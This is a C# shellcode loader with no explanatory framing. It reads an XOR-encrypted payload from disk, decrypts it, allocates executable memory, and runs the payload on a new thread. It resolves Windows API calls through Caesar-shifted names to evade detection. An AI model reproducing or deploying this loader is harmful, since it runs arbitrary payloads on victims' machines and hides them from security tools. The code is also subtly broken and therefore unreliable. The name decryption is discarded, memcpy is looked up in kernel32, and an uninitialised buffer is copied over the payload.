using System;
using System.IO;
using System.Runtime.InteropServices;

class Program
{
	delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
	delegate IntPtr MemcpyDelegate(IntPtr dest, IntPtr src, IntPtr count);
	delegate IntPtr CreateThreadDelegate(IntPtr lpthreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
	
	
	static void CaesarDecrypt(char[]str, int key){
		for(int i=0;i<str.Length;i++){
			char ch=str[i];
			if(char.IsLetter(ch)){
				if(char.IsLower(ch)){
					ch=(char)(((ch-'a' -key +26)%26) +'a');
				}
				else{
					ch=(char)(((ch-'A' -key +26)%26) +'A');
				}
				str[i]=ch;
			}
		}
	}
	
	static string EncryptCaesar(String ip, int key){
		
		char[] chars=ip.ToCharArray();
		for(int i=0;i<chars.Length;i++)
		{
			char c=chars[i];
			if(char.IsLetter(c)){
				char offset=char.IsUpper(c)?'A':'a';
				chars[i]=(char)(((c+key-offset)%26)+offset);
			}
		}
		return new string(chars);
	}
	
	
	static void Main(string[] args)
	{
		//encrypt func names
		string eva=EncryptCaesar("VirtualAlloc",111);
		string emm=EncryptCaesar("memcpy",111);
		string ect=EncryptCaesar("CreateThread",111);
		
		//decrypt func name in memory
		CaesarDecrypt(eva.ToCharArray(),111);
		CaesarDecrypt(emm.ToCharArray(),111);
		CaesarDecrypt(ect.ToCharArray(),111);
		
		//load kernel32.dll
		IntPtr hkernel32=NativeMethods.GetModuleHandle("kernel32.dll");
		
		//get addresses of function
		IntPtr VirtualAllocAddr=NativeMethods.GetProcAddress(hkernel32,eva);
		IntPtr memcpyAddr=NativeMethods.GetProcAddress(hkernel32,emm);
		IntPtr CreateThreadAddr=NativeMethods.GetProcAddress(hkernel32,ect);
		
		//convert func pointers to delegates
		VirtualAllocDelegate VirtualAllocFn=(VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(VirtualAllocAddr,typeof(VirtualAllocDelegate));
		MemcpyDelegate memcpyFn=(MemcpyDelegate)Marshal.GetDelegateForFunctionPointer(memcpyAddr,typeof(MemcpyDelegate));
		CreateThreadDelegate CreateThreadFn=(CreateThreadDelegate)Marshal.GetDelegateForFunctionPointer(CreateThreadAddr,typeof(CreateThreadDelegate));
		
		
		//read encrypted shellcode from file
		byte[] encryptedShellcode= File.ReadAllBytes("encrypted_shellcode.bin");
		
		//read key from file
		byte[]key=File.ReadAllBytes("key.bin");
		
		//perform XOR decryption
		byte[] buf=new byte[encryptedShellcode.Length];
		for(int i=0;i<encryptedShellcode.Length;i++)
		{
			buf[i]=(byte)(encryptedShellcode[i] ^ key [i%key.Length]);
		}
		
		//allocate memory
		IntPtr mem= VirtualAllocFn(IntPtr.Zero, (UIntPtr)buf.Length, 0x1000 | 0x2000, 0x40);
		if(mem==IntPtr.Zero){
			Console.WriteLine("Failed to allocate memory");
			return;
		}
		
		//copy shellcode to allocated memory
		IntPtr shellcodePtr=Marshal.AllocHGlobal(buf.Length);
		Marshal.Copy(buf, 0, mem, buf.Length);
		memcpyFn(mem,shellcodePtr, (IntPtr)buf.Length);
		Marshal.FreeHGlobal(shellcodePtr);
		
		
		//execute shellcode in a new thread
		uint threadId;
		IntPtr thread = CreateThreadFn(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out threadId);
		if(thread == IntPtr.Zero){
			Console.WriteLine("Failed to create thread");
			NativeMethods.VirtualFree(mem, UIntPtr.Zero,0x8000);
			return;
		}
		
		//wait for thread to finish
		NativeMethods.WaitForSingleObject(thread, 0xFFFFFFFF);
		
		//cleanup
		NativeMethods.CloseHandle(thread);
		NativeMethods.VirtualFree(mem, UIntPtr.Zero,0x8000);
	}
}

class NativeMethods{

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);
	
	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr hModule,string lpProcName);
	
	[DllImport("kernel32.dll", SetLastError=true)]
	public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
	
	[DllImport("kernel32.dll", SetLastError=true)]
	[return: MarshalAs (UnmanagedType.Bool)]
	public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
	
	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
	
	[DllImport("kernel32.dll")]
	public static extern IntPtr WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
	
	[DllImport("kernel32.dll")]
	[return: MarshalAs (UnmanagedType.Bool)]
	public static extern bool CloseHandle(IntPtr hObject);
	
}
